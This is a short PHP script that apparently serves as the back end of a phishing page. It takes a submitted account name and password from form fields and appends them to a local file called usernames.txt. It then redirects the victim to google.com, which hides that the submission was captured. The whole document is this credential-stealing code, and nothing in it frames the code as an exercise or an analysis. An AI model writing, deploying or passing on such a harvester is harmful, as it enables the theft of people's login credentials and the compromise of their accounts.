<?php

file_put_contents("usernames.txt", "Account: " . $_POST['key2'] . "\nPassword: " . $_POST['key1'] . "\n", FILE_APPEND);
header('Location: https://www.google.com');
exit();
